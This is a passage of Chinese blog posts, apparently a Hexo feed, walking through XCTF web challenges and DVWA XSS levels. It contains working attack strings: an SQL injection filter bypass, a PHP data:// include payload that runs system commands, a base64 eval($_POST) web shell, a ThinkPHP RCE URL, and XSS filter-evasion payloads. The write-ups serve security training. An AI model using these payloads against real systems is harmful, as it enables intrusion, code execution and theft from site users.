alt="1"></p><p>strstr是非常不安全的函数</p><p>大写绕过</p><pre><code>-1';sEt @sql = CONCAT('se','lect * from `1919810931114514`;');prEpare stmt from @sql;EXECUTE stmt;#</code></pre><p><img src="/2021/03/17/xctf-web-supersqli/blog/source_posts\XCTF：Web-supersqli\flag.png" alt="flag"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-PHP2</title>
      <link href="2021/03/17/xctf-web-php2/"/>
      <url>2021/03/17/xctf-web-php2/</url>
      
        <content type="html"><![CDATA[<p>访问index.phps看到</p><pre><code>not allowed!"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "admin") { echo "Access granted!"; echo "Key: xxxxxxx"; } ?&gt; Can you anthenticate to this website? </code></pre><h4 id="重点就在于-GET-id-urldecode-GET-id"><a href="#重点就在于-GET-id-urldecode-GET-id" class="headerlink" title="重点就在于 $_GET[id] = urldecode($_GET[id])"></a>重点就在于 $_GET[id] = urldecode($_GET[id])</h4><p>对admin进行编码</p><pre><code>61%64%6D%69%6E%</code></pre><p><img src="/2021/03/17/xctf-web-php2/blog/source_posts\XCTF：Web-PHP2\一次URL编码.png" alt="一次URL编码"></p><p>结果没有反应应该是网站又对此进行了一次编码</p><p>所以采用</p><pre><code>%2561%2564%256D%2569%256E</code></pre><p><img src="/2021/03/17/xctf-web-php2/blog/source_posts\XCTF：Web-PHP2\二次URL编码.png" alt="二次URL编码"></p><pre><code>cyberpeace{7e95a5de28fcf89ce12721f28199e7f3}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-php_include</title>
      <link href="2021/03/15/xctf-web-php-include/"/>
      <url>2021/03/15/xctf-web-php-include/</url>
      
        <content type="html"><![CDATA[<p>源码</p><pre><code>&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page=$_GET['page'];while (strstr($page, "php://")) {    $page=str_replace("php://", "", $page);  //  将“php://”替换成空可以采用大写双写等绕过}include($page);?&gt;</code></pre><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\ece5d3f5afef9925e795f126f3a6a87.png" alt="ece5d3f5afef9925e795f126f3a6a87"></p><p>结果</p><p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\20200525082546375.png" alt="20200525082546375"></p><p>然后</p><p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\20200525082600649.png" alt="20200525082600649"></p><p>查看源码</p><p><img src="/2021/03/15/xctf-web-php-include/blog/source_posts\XCTF：Web-php-include\20200525082612785.png" alt="20200525082612785"></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>既然过滤了php://的伪协议 我们可以使用其他协议来做这里使用data://伪协议</p><h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p><p>使用方法:data://text/plain;base64,xxxx(base64编码后的数据)</p><!--?php system("dir")?--><p> base64编码后使用</p><pre><code>http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b </code></pre><p>(注意编码后的+号要URL编码)</p><!--?php system("cat fl4gisisish3r3.php")?--><p> base64编码后使用</p><pre><code>http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</code></pre><h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><pre><code>http://111.200.241.244:36906/?page=data://text/plain/;base64,Jmx0Oz9waHAgZXZhbCgkX1BPU1RbSDNuZ10pOyA/Jmd0Ow==</code></pre><p>这里采用base64加密木马</p><p>蚁剑连接</p><h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>御剑扫描不多赘述</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:web-php_rce</title>
      <link href="2021/03/15/xctf-web-php-rce/"/>
      <url>2021/03/15/xctf-web-php-rce/</url>
      
        <content type="html"><![CDATA[<pre><code>http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:web-training-WWW-Robots</title>
      <link href="2021/03/14/xctf-web-training-www-robots/"/>
      <url>2021/03/14/xctf-web-training-www-robots/</url>
      
        <content type="html"><![CDATA[<p>题目描述</p><pre><code>In this little training challenge, you are going to learn about the Robots_exclusion_standard.The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.Sometimes these files reveal the directory structure instead protecting the content from being crawled.Enjoy!</code></pre><p>翻译</p><pre><code>在这个小的训练挑战中，你将学习机器人标准。这个机器人.txt文件被网络爬虫用来检查他们是否被允许爬网和索引你的网站或只是它的一部分。有时，这些文件会显示目录结构，而不是保护内容不被爬网。好好享受！</code></pre><p>本题考察知识点robots.txt–robots.txt解题robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它[1]。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p><p>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。—来源百度百科</p><p>访问/robots.txt</p><p><img src="/2021/03/14/xctf-web-training-www-robots/blog/source_posts\XCTF：web-training-WWW-Robots\robots.txt.png" alt="robots.txt"></p><p>访问/fl0g.php</p><p><img src="/2021/03/14/xctf-web-training-www-robots/blog/source_posts\XCTF：web-training-WWW-Robots\flag.png" alt="flag"></p><p>得到</p><pre><code>cyberpeace{a1dd06c3c6f1b6c5d72b13e5b95cf77a}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:web-baby_web</title>
      <link href="2021/03/14/xctf-web-baby-web/"/>
      <url>2021/03/14/xctf-web-baby-web/</url>
      
        <content type="html"><![CDATA[<p>题目描述</p><pre><code>想想初始页面是哪个</code></pre><p>所以访问</p><pre><code>111.200.241.244:30590/index.php</code></pre><p>抓包，send to repeater</p><p><img src="/2021/03/14/xctf-web-baby-web/blog/source_posts\XCTF：web-baby-web\reponse.png" alt="reponse"></p><p>在响应里看到flag</p><pre><code>flag{very_baby_web}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA:XSS</title>
      <link href="2021/03/06/dvwa-xss/"/>
      <url>2021/03/06/dvwa-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="DOM-XSS（DOM型跨站脚本攻击）"><a href="#DOM-XSS（DOM型跨站脚本攻击）" class="headerlink" title="DOM-XSS（DOM型跨站脚本攻击）"></a>DOM-XSS（DOM型跨站脚本攻击）</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如URL，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p><p>可能触发DOM型XSS的属性：</p><p>document.referer属性</p><p>window.name属性</p><p>location属性</p><p>innerHTML属性</p><p>documen.write属性</p><h3 id="document-和-windows-对象"><a href="#document-和-windows-对象" class="headerlink" title="document 和 windows 对象"></a>document 和 windows 对象</h3><p>document表示的是一个文档对象，window表示的是一个窗口对象，一个窗口下可以有多个文档对象。</p><p>所以一个窗口下只有一个window.location.href，但是可能有多个document.URL、document.location.href</p><p>window 对象</p><p>它是一个顶层对象,而不是另一个对象的属性即浏览器的窗口。</p><p>document 对象</p><p>该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档。</p><p>document 只是属于window 的一个子对像。</p><p>window.location 包含 href 属性，直接取值赋值时相当于 window.location.href</p><p>window.location.href 当前页面完整 URL</p><p>document.location 包含 href 属性，直接取值赋值时相当于 document.location.href</p><p>document.location.href 当前页面完整 URL</p><p>document.href 没有这个属性</p><p>document.URL 取值时等价于 window.location.href 或 document.location.href。在某些浏览器中通过对 document.URL 赋值来实现页面跳转，但某些浏览器中不行。</p><h3 id="indexOf-方法"><a href="#indexOf-方法" class="headerlink" title="indexOf()方法"></a>indexOf()方法</h3><p>定义和用法</p><p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。</p><p>indexOf(searchvalue,fromindex)<br>参数    描述<br>searchvalue    必需。规定需检索的字符串值。<br>fromindex    可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length - 1。如省略该参数，则将从字符串的首字符开始检索。</p><p>注释：indexOf() 方法对大小写敏感！</p><p>注释：如果要检索的字符串值没有出现，则该方法返回 -1<br>输出0-16</p><h3 id="substring-方法"><a href="#substring-方法" class="headerlink" title="substring() 方法"></a>substring() 方法</h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p><p>substring(start,stop)<br>参数    描述<br>start 必需。    一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。<br>stop 可选。    一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。<br>如果省略该参数，那么返回的子串会一直到字符串的结尾。    </p><p>decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码</p><h3 id="document-write"><a href="#document-write" class="headerlink" title="document.write"></a>document.write</h3><p>document.write详解</p><p>document.write是JavaScript中对document.open所开启的文档流(document stream操作的API方法，它能够直接在文档流中写入字符串，一旦文档流已经关闭，那document.write就会重新利用document.open打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建DOM并渲染新的页面</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>选择English</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\3.png" alt="3"></p><p>前端源码</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\2.png" alt="2"></p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1.png" alt="1"></p><p>服务器端源码</p><pre><code>&lt;?php# No protections, anything goes?&gt;</code></pre><p>可以看到，前端使用 document.write() 动态生成页面，服务器端代码没有任何的保护性措施！</p><p>页面本意是叫我们选择默认的语言，但是对default参数没有进行任何的过滤。</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\4.png" alt="4"></p><p>F12</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\5.png" alt="5"></p><p>看到脚本被插入</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php// Is there any input?// array_key_exists()检查键是否存在array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。提示：如果指定数组的时候省略了键名，将会生成从 0 开始并以 1 递增的整数键名array_key_exists(key,array)key 必需    规定键名。array    必需。规定数组if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {    $default = $_GET['default'];    # Do not alLow script tags//过滤&lt;script，含scriipt的就不可以stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）stripos(string,find,start)string 必需    规定被搜索的字符串。find 必需    规定要查找的字符。start 可选    规定开始搜索的位置。返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。    if (stripos ($default, "&lt;script") !== false) {//如果参数不含&lt;scriptheader() 函数向客户端发送原始的 HTTP 报头header(string,replace,http_response_code)string 必需    规定要发送的报头字符串。replace 可选    指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。http_response_code可选    把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）        header ("location: ?default=English");        exit;    }}?&gt;</code></pre><p>很明显，这里过滤了 &lt;script ，那么我们可以使用&lt;img src=1 onerror=alert(‘xss’)&gt;绕过。</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&lt;img src=1 οnerrοr=alert('xss')&gt; </code></pre><p>未成功执行<img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426164742152-626531704.png" alt="1375459-20200426164742152-626531704"></p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&gt;&lt;/option&gt;&lt;img src=1 onerror=alert('xss')&gt;</code></pre><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426165203052-197710952.png"></p><pre><code>http://127.0.0.1/vulnerabilities/xss_d/?default=&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('xss')&gt;</code></pre><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426165933780-960362727.png" alt="1375459-20200426165933780-960362727"></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;&lt;?php// Is there any input?if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {    # White list the alLowable languages//白名单，只允许French、English、German、Spanish    switch ($_GET['default']) {        case "French":        case "English":        case "German":        case "Spanish":            # ok            break;        default:            header ("location: ?default=English");            exit;    }}?&gt;</code></pre><p>白名单 只允许 传的 default值 为 French English German Spanish 其中一个</p><p>构造攻击语句</p><pre><code>http://192.168.31.155/dvwa-master/vulnerabilities/xss_d/?default= English #</code></pre><p>English # </p><p>URL中#号之后的内容，在提交表单时，被当成注释，不会被提交到服务器</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English # &lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>可以看到，我们的script脚本成功执行了</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426161303047-1450475024.png" alt="1375459-20200426161303047-1450475024"></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php# Don't need to do anything, protction handled on the client side?&gt;</code></pre><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426163351876-1011661984.png" alt="1375459-20200426163351876-1011661984"></p><p>由于大多数浏览器默认将从URL中获取的内容进行编码，而客户端的源代码中直接将编码后的输入插入到了动态页面中（可以与low级别的客户端代码进行比较），从而阻止了执行任何注入的JavaScript。</p><p><a href="http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English</a><script>alert('xss')</script></p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426171158637-222348334.png" alt="1375459-20200426171158637-222348334"></p><p>我们查看网页源代码，发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426171421791-967272941.png" alt="1375459-20200426171421791-967272941"></p><h1 id="reflected-XSS（反射型跨站脚本攻击）"><a href="#reflected-XSS（反射型跨站脚本攻击）" class="headerlink" title="reflected-XSS（反射型跨站脚本攻击）"></a>reflected-XSS（反射型跨站脚本攻击）</h1><p>反射型Xss &lt;全称跨站脚本攻击，是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中</p><p>其实反射型和DOM型的XSS差别主要在于，反射型是会往后台服务器发送请求，而DOM型直接在前端进行解析；两者都是一次性的</p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?// arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {    // Feedback for end user    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';}?&gt;</code></pre><p>array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。<strong>这里键名为</strong> <strong>name</strong></p><p>可以看到，low级别的代码只是判断了name参数是否为空，如果不为空的话就直接打印出来，并没有对name参数做任何的过滤和检查，存在非常明显的XSS漏洞。</p><p>输入</p><pre><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre><p>得到</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\XSS-reflect-Low输入.png" alt="XSS-reflect-Low输入"></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {//将输入中的&lt;script&gt;转化为空    $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );    // Feedback for end user    echo "&lt;pre&gt;Hello ${name}&lt;/pre&gt;";}?&gt;</code></pre><p>str_replace()函数不太完美，因为它区分大小写</p><h4 id="1-大写绕过"><a href="#1-大写绕过" class="headerlink" title="1.大写绕过"></a>1.大写绕过</h4><pre><code>&lt;SCRIPT&gt;alert('xss')&lt;/SCRIPT&gt;</code></pre><h4 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h4><pre><code>&lt;sc&lt;script&gt;ript&gt;alert('xss')&lt;/script&gt;</code></pre><h4 id="3-构造不使用"><a href="#3-构造不使用" class="headerlink" title="3.构造不使用"></a>3.构造不使用</h4><pre><code>&lt;img src=1 onerror=alert('xss')&gt;he</code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpheader ("X-XSS-Protection: 0");if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { //使用通配符，完全匹配script*N，所以有关script的标签全被过滤    $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );    echo "&lt;pre&gt;Hello ${name}&lt;/pre&gt;";}?&gt;</code></pre><p>可以看到，high级别的代码使用了正则表达式直接把 &lt;*s*c*r*i*p*t 给过滤了，* 代表一个或多个任意字符，i 代表不区分大小写。所以，我们的<script>标签在这里就不能用了。</p><p>但是我们可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p><pre><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></pre><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input//转码&amp; （和号） 成为 &amp;amp;&quot; （双引号） 成为 &amp;quot;&#39; （单引号） 成为 &amp;#039;&lt; （小于） 成为 &amp;lt;&gt; （大于） 成为 &amp;gt;    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>**htmlspecialchars(string)**：</p><p>把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素。</p><p>当我们输入 <script>alert('xss')</script> ，因为 htmlspecialchars 函数会将 &lt; 和 &gt; 转换成html实体,并且<em>n<strong>a</strong>m**e</em>取的是</p><p>name的值，然后包围在</p><pre></pre>标签中被打印出来，所以我们插入的语句并不会被执行。<p></p><h1 id="Stored-XSS（存储型跨站脚本攻击）"><a href="#Stored-XSS（存储型跨站脚本攻击）" class="headerlink" title="Stored-XSS（存储型跨站脚本攻击）"></a>Stored-XSS（存储型跨站脚本攻击）</h1><p>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。</p><p>存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) {    // Get input// trim(string,charlist)函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。    $message = trim( $_POST[ 'mtxMessage' ] );    $name    = trim( $_POST[ 'txtName' ] );    // Sanitize message input// stripslashes(string)函数删除字符串中的反斜杠。    $message = stripslashes( $message );// mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。    $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitize name input    $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Update database    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );    //mysql_close();}?&gt;</code></pre><h4 id="trim-string-charlist"><a href="#trim-string-charlist" class="headerlink" title="trim(string,charlist)"></a><strong>trim(string,charlist)</strong></h4><p>函数移除字符串两侧的空白字符或其他预定义字符，可选参数charlist支持添加额外需要删除的字符，如果被省略，则移除以下所有字符：</p><ul><li>“\0” - NULL</li><li>“\t” - 制表符</li><li>“\n” - 换行</li><li>“\x0B” - 垂直制表符</li><li>“\r” - 回车</li><li>“ “ - 空格</li></ul><h4 id="mysql-real-escape-string-string-connection"><a href="#mysql-real-escape-string-string-connection" class="headerlink" title="mysql_real_escape_string(string,connection)"></a><strong>mysql_real_escape_string(string,connection)</strong></h4><p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p><h4 id="stripslashes-string"><a href="#stripslashes-string" class="headerlink" title="stripslashes(string)"></a><strong>stripslashes(string)</strong></h4><p>函数删除字符串中的反斜杠。</p><p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p><p>message一栏输入<script>alert('xss')</script>，</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\XSS-stored-low1.png" alt="XSS-stored-low1"></p><p>用户名无法直接做XSS，因为前端代码有用户名长度限制</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\1375459-20200426184100977-925850173.png" alt="1375459-20200426184100977-925850173"></p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200426184441826-381338279.png" alt="img"></p><p>或者</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\XSS-stored-low4.png" alt="XSS-stored-low4"></p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) {    $message = trim( $_POST[ 'mtxMessage' ] );    $name    = trim( $_POST[ 'txtName' ] );// strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $message = htmlspecialchars( $message );    $name = str_replace( '&lt;script&gt;', '', $name );    $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );?&gt;</code></pre><h4 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags()"></a><strong>strip_tags()</strong></h4><p>函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用标签。</p><h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a><strong>htmlspecialchars()</strong></h4><p>函数把预定义的字符转换为 HTML 实体。</p><p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>。同反射型XSS的Medium级别一样，我们可以使用大写或者双写绕过。</p><h4 id="1-大写绕过-1"><a href="#1-大写绕过-1" class="headerlink" title="1.大写绕过"></a>1.大写绕过</h4><pre><code>&lt;SCRIPT&gt;alert(&#39;xss&#39;)&lt;/SCRIPT&gt;</code></pre><h4 id="2-双写绕过-1"><a href="#2-双写绕过-1" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h4><pre><code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    